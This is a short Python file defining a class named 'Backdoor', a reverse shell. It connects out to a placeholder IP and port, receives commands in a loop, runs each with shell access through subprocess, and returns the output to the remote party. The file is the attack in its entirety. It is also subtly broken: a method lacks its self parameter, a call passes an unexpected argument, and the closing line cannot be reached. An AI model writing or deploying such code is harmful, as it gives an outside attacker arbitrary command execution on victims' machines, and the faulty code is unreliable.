import socket , json
import subprocess

class Backdoor:
    def __init__(self , ip , port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)


    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_system_command(command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:

            command = self.reliable_receive(1024)

            command_result = self.execute_system_command(command)

            self.reliable_send(command_result)

        connection.close()


my_backdoor = Backdoor("ip" , "port")
my_backdoor.run() 
